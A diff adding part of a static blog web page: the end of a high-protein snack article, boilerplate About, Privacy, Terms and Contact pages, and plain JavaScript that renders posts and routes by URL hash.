+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If afternoon cravings are your biggest challenge, prep two or three protein snacks in advance and keep them visible in the fridge. Convenience often determines what you reach for first.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Choose the Right Snack for Your Goal</h2>
+
+<p>Different snack combinations work better for different needs. If you want something light, choose eggs with tomatoes, edamame, or Greek yogurt with berries. If you need something more filling, try tuna with crackers, chicken bites with guacamole, or a protein shake with banana.</p>
+
+<p>For a post-workout snack, protein shake with banana, Greek yogurt with berries, or chicken bites can be practical choices. For work or school, string cheese with apple, jerky with almonds, or turkey slices with cucumber are easy to pack. For plant-based snacking, edamame, hummus with vegetables, and cottage cheese alternatives can be adapted depending on your preferences.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Choose 10 to 25 grams of protein for a satisfying snack range.</li>
+    <li>Pair protein with fiber from fruit, vegetables, beans, or whole grains.</li>
+    <li>Keep portable snacks ready for work, school, travel, and errands.</li>
+    <li>Mix sweet and savory choices so healthy snacking does not feel boring.</li>
+    <li>Prep small portions ahead of time to make better choices easier.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Snack Smarter and Fuel Your Goals</h2>
+
+<p>High-protein snack ideas are not just for athletes or strict meal plans. They are practical, everyday solutions for anyone who wants to feel fuller, stay energized, and make snack time more intentional. With simple combinations like Greek yogurt and berries, cottage cheese and kiwi, eggs and tomatoes, turkey and cucumber, tuna and crackers, or chicken bites and guacamole, it is easy to create snacks that are both satisfying and convenient.</p>
+
+<p>The best approach is to keep things simple. Choose protein sources you enjoy, pair them with colorful fruits or vegetables, and prep a few grab-and-go options before your busiest days. When healthy snacks are ready, visible, and appealing, reaching for them becomes much easier.</p>
+
+<p>Whether your goal is meal prep, post-workout recovery, better afternoon energy, or healthier cravings, these high-protein snack combos can help you snack smarter and fuel your goals one bite at a time.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Snack Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Protein Snack Combos</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Healthy Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Post Workout Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Snack Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Cravings</span>
+</div>
+                `
+}
+        ];
+
+       
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Katy Deliciously Easy Recipes Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
